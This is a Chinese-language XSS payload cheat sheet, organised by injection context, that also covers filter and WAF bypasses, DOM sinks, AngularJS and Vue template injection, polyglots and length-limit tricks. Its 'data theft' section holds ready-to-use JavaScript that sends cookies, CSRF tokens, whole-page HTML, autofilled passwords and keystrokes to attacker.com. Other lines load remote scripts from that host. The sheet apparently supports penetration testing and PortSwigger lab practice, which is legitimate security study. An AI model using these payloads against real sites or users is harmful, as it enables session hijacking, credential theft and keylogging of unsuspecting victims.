# XSS Payloads

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [JavaScript for XSS](../JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](../DOM%20and%20Browser/DOM%20and%20Browser.md)

---

## 使用说明

此速查表按**注入上下文**组织 payload。在使用任何 payload 之前：

1. 确定反射上下文（HTML 标签之间？属性内？JavaScript 字符串？模板字面量？）
2. 确定应用程序执行的输入验证或处理类型
3. 从对应上下文的章节中选择候选 payload
4. 如果被过滤或修改，尝试替代 payload 或绕过技术

**PoC 提醒：** Chrome 92+ 在跨源 iframe 中阻止 `alert()`。在此场景下，使用 `print()` 作为替代 PoC payload。

---

## HTML Body 上下文 -- 注入点在 HTML 标签之间

当用户输入被直接放在 HTML 标签之间时（`<div>用户输入</div>`），使用以下 payload：

### 基础 Payloads

```html
<!-- 最经典的 script 标签 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 加载外部脚本（绕过长度限制） -->
<script src="https://attacker.com/xss.js"></script>

<!-- img onerror -- 最常用，无需交互 -->
<img src=x onerror=alert(1)>
<img src=1 onerror=alert(1)>

<!-- svg onload -- HTML5 标准，非常可靠 -->
<svg onload=alert(1)>
<svg><svg onload=alert(1)>

<!-- body onload -->
<body onload=alert(1)>

<!-- iframe javascript: -->
<iframe src="javascript:alert(1)">

<!-- input autofocus onfocus -->
<input autofocus onfocus=alert(1)>

<!-- select autofocus onfocus -->
<select autofocus onfocus=alert(1)>

<!-- textarea autofocus onfocus -->
<textarea autofocus onfocus=alert(1)>

<!-- video onerror -->
<video><source onerror=alert(1)>

<!-- audio onerror -->
<audio src=x onerror=alert(1)>

<!-- details open ontoggle -->
<details open ontoggle=alert(1)>

<!-- marquee 已废弃但很多浏览器仍支持 -->
<marquee onstart=alert(1)>
```

```
<svg><animatetransform onbegin=alert(1)>
```
### 无交互触发的事件 Payloads

这些 payload 无需用户点击或悬停即可自动触发：

```html
<!-- 最佳选择：img onerror -->
<img src=x onerror=alert(1)>

<!-- 备选：svg onload -->
<svg onload=alert(1)>

<!-- 备选：autofocus + onfocus -->
<input autofocus onfocus=alert(1)>

<!-- CSS 动画触发 -->
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>

<!-- CSS 过渡触发 -->
<style>div{transition:all 1s}</style><div style="opacity:.99" ontransitionend=alert(1)>

<!-- details 元素 -->
<details open ontoggle=alert(1)>
```

### 受限场景的替代 Payloads

```html
<!-- 常见标签被过滤时的替代方案 -->
<image src=x onerror=alert(1)>        <!-- image 是 img 的别名 -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<math><mi label="x" onmouseover=alert(1)>  <!-- 数学标记 -->
<isindex type=image src=1 onerror=alert(1)>  <!-- 废弃但可能有效 -->
<keygen autofocus onfocus=alert(1)>    <!-- 废弃但可能有效 -->
```

---

## HTML 属性上下文 -- 注入点在标签属性值中

### 脱离属性值

当输入在属性值中且可以注入 `"` 或 `'` 时：

```html
<!-- 闭合双引号属性 -->
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="

<!-- 闭合单引号属性 -->
' autofocus onfocus=alert(1) x='
' onfocus=alert(1) autofocus x='

<!-- 无引号属性 -->
x autofocus onfocus=alert(1) x=x
```

### 在 href/src 属性中使用 javascript: 伪协议

当输入在 `<a href="...">` 或类似属性中时：

```html
javascript:alert(1)
javascript:prompt(1)
javascript:eval(atob('YWxlcnQoMSk='))
```

### 无法脱离属性但可以注入事件处理器

当 `>`, `<`, `"`, `'` 都被过滤，但可以在属性值内注入空格时：

```html
<!-- 利用 accesskey（需要用户按特定组合键） -->
accesskey=x onclick=alert(1)

<!-- 在 hidden input 中利用 style 覆盖 -->
style="display:block" autofocus onfocus=alert(1)
```

---

## JavaScript 字符串上下文 -- 注入点在 `<script>` 块的字符串内

### 脱离字符串

当输入在 `var x = '用户输入';` 中时：

```javascript
// 闭合单引号字符串
'; alert(1); //
';alert(document.domain)//

// 不依赖分号
'-alert(1)-'
'-alert(1)-'

// 闭合双引号字符串
"; alert(1); //
"-alert(1)-"

// 脱离 script 标签重新开始
</script><script>alert(1)</script>
</script><img src=x onerror=alert(1)>
```

### 反斜杠转义绕过

当应用程序用反斜杠转义引号但未转义反斜杠本身时：

```javascript
// 输入：\';alert(1)//
// 被转义后：\\';alert(1)//
// 结果：反斜杠被反斜杠转义，引号成为字符串终止符
\';alert(1)//
```

### 无括号调用函数

当括号被过滤时：

```javascript
// 使用 onerror + throw
onerror=alert;throw 1

// 使用 setTimeout（如果 setTimeout 可用）
onerror=setTimeout;throw'alert\x281\x29'

// 使用 bind
onerror=alert.bind(null,1);throw''

// ES6 tagged template（需要反引号）
onerror=alert;throw`1`
```

### 多行 payload

```javascript
// 使用 ES6 模板字面量（反引号）
`;alert(1);`

// 使用换行
';
alert(1);
//
```

---

## JavaScript 模板字面量上下文

当输入在模板字面量中时（`` var x = `用户输入`; ``）：

```javascript
// 直接嵌入表达式
${alert(1)}

// 复杂表达式
${document.location='javascript:alert(1)'}

// 使用 constructor 链
${Object.constructor.constructor('alert(1)')()}
```

---

## DOM XSS Payloads（特定 Sink）

### document.write Sink

```javascript
// 需要闭合上下文再注入
<script>alert(1)</script>

// 如果上下文有前缀，先闭合
'); document.write('<img src=x onerror=alert(1)>'); //
```

### innerHTML Sink

```html
<!-- script 不执行，使用事件处理器 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>

<!-- 需要闭合上下文 -->
"> <img src=x onerror=alert(1)><!--
```

### location.hash 注入

```javascript
// payload 放在 URL hash 中
https://site.com/page#<img src=x onerror=alert(1)>

// 如果 hash 被作为选择器
https://site.com/page#x"><img src=x onerror=alert(1)>
```

### postMessage 注入

```javascript
// 发送恶意消息
window.opener.postMessage('<img src=x onerror=alert(1)>', '*');
targetWindow.postMessage('{"type":"msg","content":"<img src=x onerror=alert(1)>"}', '*');
```

### AngularJS 表达式

```javascript
// AngularJS 1.x sandbox 逃逸（已修补的旧版本）
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}

// AngularJS 1.6+ 不再有 sandbox
{{alert(1)}}
```

### Vue.js

```html
<!-- v-html 注入 -->
<div v-html="'<img src=x onerror=alert(1)>'"></div>

<!-- 模板注入（较少见） -->
{{constructor.constructor('alert(1)')()}}
```

---

## WAF 与过滤器绕过 Payloads

### 大小写混淆

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
<IfRaMe SrC="jAvAsCrIpT:alert(1)">
```

### 标签名混淆

```html
<!-- 在标签名后插入空字节或控制字符 -->
<script\x00>alert(1)</script>
<script\x20>alert(1)</script>

<!-- 使用不完整的标签 -->
<svg><script>alert(1)</script>
```

### 空格替代

```html
<!-- / 替代空格 -->
<img/src=x/onerror=alert(1)>

<!-- %0A (换行) 替代空格 -->
<img%0Asrc=x%0Aonerror=alert(1)>

<!-- %0D (回车) 替代空格 -->
<img%0Dsrc=x%0Donerror=alert(1)>

<!-- %09 (Tab) 替代空格 -->
<img%09src=x%09onerror=alert(1)>

<!-- /**/ 替代空格 (在事件处理器中) -->
<img src=x onerror=/**/alert(1)>
```

### 编码绕过

```html
<!-- HTML 实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL 编码 -->
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

<!-- 双重 URL 编码 -->
%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E

<!-- Unicode 编码 -->
<img src=x onerror="alert(1)">

<!-- Base64 (需要 eval+atob) -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### 协议绕过

当 `javascript:` 被过滤时：

```html
<!-- data: 协议 (在某些上下文中) -->
<iframe src="data:text/html,<script>alert(1)</script>">

<!-- 使用大小写混淆 -->
<iframe src="JaVaScRiPt:alert(1)">

<!-- 使用 HTML 实体编码冒号 -->
<iframe src="javascript&#58;alert(1)">

<!-- 使用 Tab/换行替代冒号后的空白 -->
<iframe src="javascript:alert(1)">
```

### 语义绕过

```html
<!-- <script> 被过滤时使用其他执行途径 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 所有事件处理器都被过滤时 -->
<a href="javascript:alert(1)">click</a>

<!-- 使用 import() 动态导入 (ES6 模块) -->
<script>import('data:text/javascript,alert(1)')</script>
```

---

## 数据窃取 Payloads

### Cookie 窃取

```javascript
// 使用 fetch (现代浏览器)
fetch('https://attacker.com/?c=' + encodeURIComponent(document.cookie));

// 使用 Image 对象 (无需 CORS)
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);

// 使用 navigator.sendBeacon (最隐蔽)
navigator.sendBeacon('https://attacker.com/', 'c=' + encodeURIComponent(document.cookie));

// 使用 window.open
window.open('https://attacker.com/?c=' + document.cookie);
```

### CSRF Token 窃取

```javascript
// 从 meta 标签读取
var token = document.querySelector('meta[name="csrf-token"]').content;

// 从隐藏字段读取
var token = document.querySelector('input[name="csrf"]').value;

// 读取后发送
fetch('https://attacker.com/?t=' + token);
```

### 页面内容窃取

```javascript
// 窃取整个页面 HTML
fetch('https://attacker.com/', {
    method: 'POST',
    body: document.documentElement.outerHTML
});

// 窃取特定元素
var data = document.querySelector('.sensitive').innerHTML;
new Image().src = 'https://attacker.com/?d=' + encodeURIComponent(data);
```

### 密码捕获

```javascript
// 创建伪造登录表单并捕获自动填充
var p = document.createElement('input');
p.type = 'password';
p.autocomplete = 'current-password';
document.body.appendChild(p);
setTimeout(function() {
    new Image().src = 'https://attacker.com/?p=' + encodeURIComponent(p.value);
}, 3000);
```

### 键盘记录

```javascript
document.onkeydown = function(e) {
    new Image().src = 'https://attacker.com/?k=' + e.key;
};
```

---

## 无字母数字 Payloads (JSFuck)

使用 JSFuck 可以将 JavaScript 代码转换为仅包含 `[]()!+` 六种字符的形式。

在线生成器通常用于生成 JSFuck 编码的 payload：

```javascript
// alert(1) 转换为 JSFuck 的概念（实际 JSFuck 代码会非常长）
[][(![]+[])[+[]]+...]([])()
```

简化的无括号调用技术：

```javascript
// 在 onerror 中无需括号调用 alert(1)
onerror=alert;throw 1

// 使用 setTimeout
onerror=setTimeout;throw'alert\x281\x29'
```

---

## 长度限制绕过

### 短 Payload

```html
<!-- 最简短的几种 -->
<svg onload=alert(1)>          <!-- 22 chars -->
<img src=x onerror=alert(1)>   <!-- 27 chars -->
<body onload=alert(1)>         <!-- 22 chars -->
```

### 外部脚本加载

当 payload 长度有限时，使用外部脚本：

```html
<script src="https://attacker.com/s.js">
<script src=//attacker.com/s.js>
```

### 多个注入点拼接

利用页面上的多个注入点拼接代码：

```html
<!-- 注入点1 -->
<script>var a='payload_part1_</script>

<!-- 注入点2 -->
<script>var b='payload_part2_</script>

<!-- 注入点3 -->
<script>eval(a+b)</script>
```

### 动态导入

```html
<script>import('//attacker.com/x')</script>
```

---

## Chrome 92+ 注意事项

由于 Chrome 92 起阻止跨源 iframe 调用 `alert()`，在使用 iframe 构造高级 XSS 攻击时，需要使用替代 PoC：

```javascript
// 替代 PoC 方案
print()                           // 触发打印对话框
document.body.style.background='red'  // 修改页面样式（可见但不明显）
window.location = 'https://attacker.com'  // 重定向（影响用户体验）
```

PortSwigger 的 XSS labs 已针对使用 Chrome 的模拟受害者进行了修改，相关 lab 可以使用 `print()` 解决。

---

## Polyglot Payloads

Polyglot payload 是设计为在多种上下文（HTML、属性、JavaScript）中同时有效的 payload：

```html
// 经典 polyglot
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

// 无引号 polyglot
#"><img src=x onerror=alert(1)>

// 多上下文通用
*/alert(1)</script><img src=x onerror=alert(1)>
```

---

> **参考：** [XSS 主文档](../Cross-site%20scripting%20(XSS).md) | [JavaScript for XSS](../JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](../DOM%20and%20Browser/DOM%20and%20Browser.md)
